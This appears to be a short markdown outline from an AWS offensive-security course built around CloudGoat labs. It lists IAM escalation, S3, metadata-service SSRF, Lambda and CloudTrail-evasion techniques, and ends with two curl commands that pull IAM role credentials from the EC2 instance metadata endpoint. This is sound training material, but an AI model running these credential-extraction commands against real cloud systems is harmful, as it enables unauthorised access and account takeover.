# ☁️ AWS Offensive Security & Exploitation

> **Phase:** [phase-e-cloud](../) | **Tags:** `#cloud` `#aws` `#iam` `#s3` `#pacu`  
> **Target:** CloudGoat Labs & AWS Misconfigurations

---

## 📑 Core Attack Vectors in AWS
- [ ] 1. IAM Privilege Escalation (21 Known Techniques: `iam:CreatePolicyVersion`, `iam:PassRole`)
- [ ] 2. S3 Bucket Misconfigurations (Public Read/Write, ACL abuse)
- [ ] 3. SSRF to EC2 Instance Metadata Service (IMDSv1 vs IMDSv2 token theft)
- [ ] 4. Lambda Function Injections & Secrets Extraction
- [ ] 5. CloudTrail Evasion & Lateral Movement

---

## 💻 IMDSv1 Credential Extraction
```bash
# IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
```
